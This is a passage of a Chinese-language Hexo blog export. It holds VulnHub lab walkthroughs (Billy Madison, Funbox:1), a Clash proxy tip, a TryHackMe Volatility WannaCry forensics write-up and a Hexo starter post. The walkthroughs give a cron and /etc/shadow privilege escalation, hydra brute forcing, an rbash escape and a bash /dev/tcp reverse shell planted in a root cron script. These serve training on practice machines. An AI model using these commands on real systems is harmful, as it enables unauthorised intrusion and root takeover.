            100%[==================================&gt;] 827.94K  --.-KB/s    <span class="hljs-keyword">in</span> 0.01s   <br><br>2023-12-03 06:56:14 (56.4 MB/s) - ‘linpeas.sh’ saved [847815/847815]<br><br>eric@BM:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh <br></code></pre></td></tr></table></figure><p>运行脚本之后，我们可以找到一个有趣的文件<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eaf6f9ff3a060c400420b.png"><br>我们从整个eric的攻击流程可以知道他使用了一个钓鱼的手法让veronica下载了一个恶意文件，我们可以检查一下这个文件的md5值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">md5sum</span> /usr/local/share/sgml/donpcgd<br>cd3621324a40c20e54aad9ecef2f6ed5  /usr/local/share/sgml/donpcgd<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4da69d96a6ee138ed0189.png"><br>我们用google搜索dgcpnod后即可发现这个exploit的利用方法<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a001dcb36c87bcc9eb740.png"><br>而具体的exp如下<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d8d3433d6f3912a577e06.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">touch</span> /tmp/rootme; <span class="hljs-built_in">chmod</span> +x /tmp/rootme; /usr/local/share/sgml/donpcgd /tmp/rootme /etc/cron.hourly/rootme; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash \n chmod 777 /etc/shadow&#x27;</span> &gt; /etc/cron.hourly/rootme<br><span class="hljs-comment">#### mknod(/etc/cron.hourly/rootme,81fd,0)</span><br></code></pre></td></tr></table></figure><p>然后我们可以用watch命令监察/etc/shadow</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">watch -n 5 <span class="hljs-string">&quot;ls -la /etc/shadow&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>-n</code> 指定每次监察间隔<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b056a9c35d4c3ba2ea361.png"><br>这时我们就可以修改shadow文件来提权(稳妥起见可以先对shadow文件进行备份，不管是修改shadow文件还是passwd文件，原理都是一样的)<br>第一步：生成密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 root <br></code></pre></td></tr></table></figure></li><li><code>-m</code> 加密指定模式<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/67e9daaeb42036fedf4f6.png"><br>第二步：将原来的hash值或者x(passwd文件)替换为我们生成的hash值<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/509f5e95160690c1bdcb2.png"><br>至此，提权成功，使用su切换到root用户<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f4f7a281a156d3ae7b58c.png"></li></ul><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p><a href="https://www.vulnhub.com/entry/billy-madison-11,161/">Billy Madison下载</a><br><a href="https://documentation.meraki.com/MX/NAT_and_Port_Forwarding/Active_and_Passive_FTP_Overview_and_Configuration#:~:text=Passive%20FTP%20is%20an%20FTP,the%20connection%20to%20the%20server">ftp的passive模式</a><br><a href="https://www.youtube.com/watch?v=0gQiv_pkOPw">youtube视频 wp</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp funbox:1</title>
    <link href="/vulnhub-wp-funbox1/"/>
    <url>/vulnhub-wp-funbox1/</url>
    
    <content type="html"><![CDATA[<h1 id="🔍-信息收集-Enumeration"><a href="#🔍-信息收集-Enumeration" class="headerlink" title="🔍 信息收集(Enumeration)"></a>🔍 信息收集(Enumeration)</h1><h2 id="🖳-主机发现-Host-Discover"><a href="#🖳-主机发现-Host-Discover" class="headerlink" title="🖳 主机发现(Host Discover)"></a>🖳 主机发现(Host Discover)</h2><p>我们使用netdiscover命令扫描kali的c段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.61.0/24  <br></code></pre></td></tr></table></figure><ul><li><code>-r</code> 指定网段<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7e214193ca77ae6d2758c.png"><br>发现目标机是<em>192.168.61.7</em></p></blockquote><h2 id="👁-端口扫描-Port-Scan"><a href="#👁-端口扫描-Port-Scan" class="headerlink" title="👁 端口扫描(Port Scan)"></a>👁 端口扫描(Port Scan)</h2>我们使用nmap进行一个全扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- 192.168.61.7 -sV <br></code></pre></td></tr></table></figure></li><li><code>-p-</code> 扫描全端口  (<em>注：这会产生比较大的流量</em>)</li><li><code>-sV</code> 探测端口服务<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e0b912d1bf1022b6b9223.png"><br>得到一个ftp，ssh，http还有一个类似mysql的服务</p></blockquote></li></ul><h2 id="🕵‍♂-服务探测-Service-Detection"><a href="#🕵‍♂-服务探测-Service-Detection" class="headerlink" title="🕵‍♂ 服务探测(Service Detection)"></a>🕵‍♂ 服务探测(Service Detection)</h2><p>我们先从最简单的开始，http，访问目标的80端口。</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/47643d14626051c3c09bd.png"><br>发现被重定向到了一个未知的url，那我们修改hosts文件把这个url绑定到目标ip，然后重新访问</p></blockquote><p>然后发现目标web的cms指纹是wp，那直接上专业工具</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a54e76bbe009bd9abcdd7.png"></p></blockquote><p>我们使用wpscan对目标网站进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vp,vt,u --url http://funbox.fritz.box/<br></code></pre></td></tr></table></figure><ul><li><code>-e vp,vt,u</code>指定使用主题漏洞扫描(vt),插件漏洞扫描(vp)，用户扫描(u)</li><li><code>--url</code> 指定扫描目标<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/07382fb560a34d0ec3dd9.png"><br>发现枚举出了俩个用户，可以去登录界面试试弱口令</p></blockquote></li></ul><h1 id="🚪🚶-获取权限-Foothold"><a href="#🚪🚶-获取权限-Foothold" class="headerlink" title="🚪🚶 获取权限(Foothold)"></a>🚪🚶 获取权限(Foothold)</h1><h2 id="💲-ssh获取shell-ssh-get-shell"><a href="#💲-ssh获取shell-ssh-get-shell" class="headerlink" title="💲 ssh获取shell(ssh get shell)"></a>💲 ssh获取shell(ssh get shell)</h2><p>经过尝试，发现用户joe有弱口令<em>12345</em>，那我们可以联想到是否ftp和ssh也有弱口令？<br>直接上hydra(九头蛇)爆破试试，注：<em>在真实渗透测试中，我们应该尽量减少暴力破解的次数，或者应当在收集到了足够的信息再去爆破</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l joe -P top1000.txt -v 192.168.61.7 ssh -t 4<br></code></pre></td></tr></table></figure><ul><li><code>-l</code> 指定用户名</li><li><code>-P</code> 指定密码字典</li><li><code>-v</code> 指定详细信息输出，将会输出爆破进度</li><li><code>ip + 服务名</code></li><li><code>-t</code> 指定线程为4，在ssh爆破时，应使用hydra推荐的线程数4<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/094a4eac27394b27b02b9.png"><br>接下来我们就可以使用弱口令直接ssh登录joe用户</p></blockquote></li></ul><h2 id="🏃-rbash逃逸-rbash-escape"><a href="#🏃-rbash逃逸-rbash-escape" class="headerlink" title="🏃 rbash逃逸(rbash escape)"></a>🏃 rbash逃逸(rbash escape)</h2><p>我们可以发现，获取的是一个rbash，这个时候我们就要进行rbash逃逸。<br>注：<em>这里的pspy64文件是我之前打靶的时候就已经下载了的文件</em></p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eedad5d0b0978b28b260a.png"></p></blockquote><p>逃逸方法有很多种，我这里就用python来逃逸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>然后我们先看看mbox是个什么东西(一般自己家目录下都会有点东西提示)</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/56ae90f4639c80ade9244.png"><br>重点解读就是joe用户帮root用户写过一个脚本，还有joe用户将密码设成了12345</p></blockquote><h1 id="🛡️-权限提升-Privilege-Escalation"><a href="#🛡️-权限提升-Privilege-Escalation" class="headerlink" title="🛡️ 权限提升(Privilege Escalation)"></a>🛡️ 权限提升(Privilege Escalation)</h1><p>然后我们就是找这个脚本，后经过一番寻找，我们最终在funny的家目录下发现了backup脚本，还有一个网站的打包文件</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/13fc337e8d37e471ae16c.png"><br>到了这，我们可以猜测这个就是joe用户写的脚本，脚本里面的内容是对/var/www/html目录进行打包。那就很明显了，和网站备份相关的计划任务。</p></blockquote><p>为了验证我们的猜想，我们用pspy工具检测一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64<br><span class="hljs-built_in">chmod</span> +x pspy64<br>./pspy64 -d /home/funny<br></code></pre></td></tr></table></figure><ul><li><code>-d</code> 指定要观察的目录<br>pspy（也称为”pspy64”）是一个用于监视进程活动的工具，特别是在Linux环境中。它允许用户监视正在运行的进程，查看它们的活动和与文件系统的交互，以及与其他进程的通信。pspy是一个轻量级的工具，通常被用于安全审计和故障排除，也可以用于发现潜在的安全问题。<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b7b6b4af3149bae0c0995.png"><br>果然，是发现有一个root的计划任务和funny的计划任务，后面更是发现，root是5分钟执行一次，funny用户是2分钟执行一次</p></blockquote><h2 id="💀-反弹root-shell-reverse-root-shell"><a href="#💀-反弹root-shell-reverse-root-shell" class="headerlink" title="💀 反弹root shell(reverse root shell)"></a>💀 反弹root shell(reverse root shell)</h2>因为我们对backup有修改权限，我们直接在backup脚本中写入反弹shell的语句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.61.126/1234 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li><li><code>bash -i</code> 这部分启动Bash shell，并使用-i标志表示要以交互方式运行，这意味着它可以接收用户输入并显示输出</li></ul><ul><li><code>&gt;&amp; /dev/tcp/192.168.61.126/1234</code> 这是一个重定向操作符，将Bash的标准输出和标准错误（1和2）都重定向到指定的IP地址和端口上的网络连接。具体来说，它将输出重定向到/dev/tcp/192.168.61.126/1234。 </li><li><code>0&gt;&amp;1</code> 这也是一个重定向操作符，将标准输入（0）重定向到与标准输出相同的地方，也就是之前重定向到网络连接的位置。</li></ul><p><em>这个命令的作用是将Bash shell的输入和输出连接到IP地址192.168.61.126上的端口1234，这通常用于建立与另一台计算机的反向Shell连接，使远程主机可以控制和执行命令在被攻击的主机上</em><br>这是一个常见的bash反弹shell的语句，然后我们在kali开启nc监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnvp 1234<br></code></pre></td></tr></table></figure><ul><li><code>-l</code>: 这是netcat的一个选项，用于指示netcat进入监听模式，即等待传入连接。</li><li><code>-n</code>: 这是另一个选项，用于指示netcat不要执行DNS解析，以便更快地处理连接。</li><li><code>-v</code>: 这是一个选项，用于启用详细的输出，通常用于调试目的。</li><li><code>-p</code>: 指定netcat监听的端口号。在这个例子中，它监听端口1234。</li></ul><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/542b7d44ebc8de496e855.png"><br>多次监听后也是成功拿到了root的shell</p></blockquote><h1 id="🐇-兔子洞-rabbit-hole"><a href="#🐇-兔子洞-rabbit-hole" class="headerlink" title="🐇 兔子洞(rabbit hole)"></a>🐇 兔子洞(rabbit hole)</h1><p>一开始我们在wpscan扫描出来的另外一个用户，admin，我们拿到joe的shell后可以去网站目录下看wp的配置文件，然后进入数据库查看用户名和密码</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/cdabd8ccbe42d5dd99a36.png"></p></blockquote><p>接着我们把这个给复制出来，用john去爆破这个hash值</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4bd2db2cd64b31a2b16c6.png"></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><ul><li><code>pass.txt</code> 将要破解的hash值写入一个文本文件</li><li><code>--wordlist=</code> 指定密码字典为kali共享目录下的rockyou字典<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/820ac9f18fdb94c6a0373.png"></p></blockquote></li></ul><p>爆破出来后我们可以看到是<code>iubire</code>，拿去登录看看</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/90b8aaa87687692b46389.png"></p></blockquote><p>成功登录后我们可以试着看能不能用wp的漏洞去getshell，但是很显然在这里应该是拿不到root权限的，最多拿一个普通shell，或者说普通shell都拿不到<br>具体咋样还有待后续的尝试<br><em>待续</em></p><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p>国外大佬关于funbox:1的wp:<a href="https://tiagotavares.io/2020/08/funbox-1-vulnhub/#-foothold">funbox:1</a><br>rbash逃逸的方法:<a href="https://xz.aliyun.com/t/7642">rbash逃逸</a><br>funbox:1靶机下载地址:<a href="https://www.vulnhub.com/entry/funbox-1,518/">下载</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux使用clash简便方法</title>
    <link href="/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/"/>
    <url>/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="如何超级简单的使用魔法，在你的虚拟机中？"><a href="#如何超级简单的使用魔法，在你的虚拟机中？" class="headerlink" title="如何超级简单的使用魔法，在你的虚拟机中？"></a>如何超级简单的使用魔法，在你的虚拟机中？</h2><p>平时在虚拟机中总会遇到用魔法的时候，但是有这么几个问题？</p><ul><li>linux 不同于 windows，操作安装都简单（大佬略过），我们在 linux 上安装 v2ray 或者 clash 都会可能时不时遇到报错，又或者配置错误</li><li>可能会有很多太虚拟机，每台虚拟机都配置一下岂不是很烦？</li><li>有的魔法会限制设备数，虚拟机和本机是算一个还是多个（这个我不知道，存疑）</li></ul><p>诸如以上的问题，那要如何方便的使用魔法，只需俩步：</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>在 windows 的 clash 客户端中开启 Allow Lan 选项，如图</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bd6da1cfa43536515211b.png"><br>此时记住我们的端口号</p></blockquote><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>打开我们的虚拟机的设置，按以下步骤设置</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f04002b20e7398c81cd1f.png"></p></blockquote><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2a6c3590350c838c1c0a3.png"></p></blockquote><p>此时我们在终端和浏览器中都可以访问外网了<br>这样我们 git 也快很多，也不必换源了。<br>v2ray 的话没有去试过，因为之前 v2ray 的订阅过期了，但是 v2ray 里有个相同的设置，按道理应该也可以</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/05b311eecc4013f3b4d68.png"></p></blockquote><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><ul><li>一般物理机 ip 分配的不会变，但是如果虚拟机不能施展魔法了，请查看物理机 ip 是否改变</li><li>虚拟机和物理机要在同一个局域网中，建议使用虚拟机中的桥接模式，然后在网络设置中选择和物理机同一张网卡</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>我之前是用的 ubuntu23 版本，然后在网上换了个阿里云的源，后面下载 ssh 服务和其他东西的的时候一直报错安装不了</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/21e0106f6e08af927e5f7.png"></p></blockquote><p>当时一直问 gpt，然后没解决，后面百度了” g++ : 依赖: cpp (= 4:9.3.0-1ubuntu2) 但是 4:12.2.0-3ubuntu1 正要被安装”才知道是因为源的问题，然后我又换回原来的源</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>clash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>clash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme房间volatility 取证</title>
    <link href="/tryhackme%E6%88%BF%E9%97%B4volatility%20%E5%8F%96%E8%AF%81/"/>
    <url>/tryhackme%E6%88%BF%E9%97%B4volatility%20%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="题目-1"><a href="#题目-1" class="headerlink" title="题目 1"></a>题目 1</h1><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d981f70b0a96644b8e338.png"><br>已知信息：由 abode 文档感染而来,还有一个 ip</p><ul><li>第一问和第二问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9d6cec469ce44083152b8.png"><br>就是求主机信息，根据前面的教程，我们用 windows.info 插件就可以</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.info<br></code></pre></td></tr></table></figure><blockquote><p>此处-f 指定镜像内存文件</p></blockquote><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f88bf187bdfe43fc9e5f.png"></p></blockquote><ul><li>第三问 <u><br>What process can be considered suspicious in Case 001?</u><br>哪个是可疑进程，用 windows.pslist 求出进程列表就行，如果没发现，就用 windows.psscan，可以看隐藏的进程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.pslist<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8247d4d481636428691fb.png"><br>根据之前给的提示，就是这个 reader_sl.exe 进程，把这个的信息交上去即可</p></blockquote><ul><li>第 456 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f6c9f21cc546bbae1434c.png"><br>就是求父进程信息，可疑进程 pid，父进程 pid，我们用 windows.pstree</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.pstree<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1c317d503bcf162f98fb3.png"></p></blockquote><ul><li>第七八问<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0b839dc4d4b38ec6bdd8c.png"><br>求 user-agent 以及一个银行也没有关系，这个时候就要查一个具体的进程内容了<br>这个时候，可以用 windows.memmap.Memmap 插件看内存信息，然后–dump 给保存下来</p></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem -o /tmp/ windows.memmap.Memmap --pid 1640 --dump<br></code></pre></td></tr></table></figure><blockquote><p>-o 指定输出路径，–pid 指定进程 pid，–dump 保存进程信息<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/19fd7393ac32f675d98a3.png"><br>这是正常的输出<br>然后用 strings 命令打印输出</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings /tmp/*.dmp | grep -i user-agent<br></code></pre></td></tr></table></figure><blockquote><p>grep -i 忽略大小写<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/30ca5f8ebcb96c431b47e.png"></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings /tmp/*.dmp | grep -i chase<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/663d31ed91db660eb3c19.png"><br>看到输出了和 chase 有关的网站，那就是有关了</p></blockquote><h1 id="题目-2"><a href="#题目-2" class="headerlink" title="题目 2"></a>题目 2</h1><p>题目内容是中了勒索病毒</p><ul><li>第一问<br>求可疑进程，用 windows.pslist 即可，然后就可以看见大名鼎鼎的@WanaDecryptor@<br>可以看出来和 wannacry 有关，pid 为 740</li></ul><ul><li>第 2345 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f3961a062c95d11f65ebf.png"><br>父进程可以用 windows.pstree 求出来<br>完整路径可以用 windows.dlllist</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.dlllist | grep @WanaDecryptor@.exe<br></code></pre></td></tr></table></figure><blockquote><p>此处也可以用–pid 指定进程，然后可以看见第一个出来的就是他的完整路径<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/904ac9588136018c151ab.png"><br>至于第 5 问，把可疑进程名字放到浏览器一搜就可以看见大名鼎鼎的 Wannacry 病毒</p></blockquote><ul><li>第 6 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/654189c4a023ad21740a0.png"><br>问 decryptor 加载了什么 dll 去创建 socket，之前可以知道 decryptor 就是 taskche.exe，pid 为 1940<br>先用 windows.dlllist 求出所有的 dll</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.dlllist --pid 1940 | grep .dll<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8f04e5642bdf1d58bbbf2.png"><br>然后把所有信息复制下来去问 gpt，让他讲解这里面的 dll 都是什么功能<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5792ece2faae0c83e681d.png"></p></blockquote><ul><li>第 7 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7ffdc296bcca2c1db8119.png"><br>哪些互斥体(mutex)可以看出是恶意软件<br>想知道 mutex 是什么可以去问 gpt<br>这个时候我们就需要用到 windows.handles，这个插件可以列出一个进程的所有句柄<br>那么，句柄（handles）又是什么呢？</li></ul><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ce4809f4968ba0365d65b.png">可以参考这个，学过操作系统的应该都可以明白</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.handles --pid 1940<br></code></pre></td></tr></table></figure><p>现在来看看输出</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1cefe6ad7f8b049e31e29.png"><br>现在不明白的都可以看到了，至于哪个是答案，可以从搜索引擎得到答案，搜索引擎很重要</p></blockquote><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Wannacry mutant</span><br></code></pre></td></tr></table></figure><p>这样搜即可</p><ul><li>最后一问，这个我也不会，没搞明白，也是通过看提示 windows.filescan，这就是答案</li></ul><h1 id="推荐文章视频"><a href="#推荐文章视频" class="headerlink" title="推荐文章视频"></a>推荐文章视频</h1><p>大神做这个房间的时候的视频（youtube）：<a href="https://www.youtube.com/watch?v=2DZqg2rcYTk">volatility 视频</a><br>有关 Wannacry 的文章，在这里面可以找到有关哪个 mutant 和 dll 的讲解：<a href="https://www.mandiant.com/resources/blog/wannacry-malware-profile">WannaCry Malware Profile</a></p>]]></content>
    
    
    <categories>
      
      <category>tryhackme</category>
      
      <category>取证</category>
      
      <category>volatility</category>
      
    </categories>
    
    
    <tags>
      
      <tag>volatility</tag>
      
      <tag>tryhackme</tag>
      
      <tag>取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/hello-world/"/>
    <url>/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
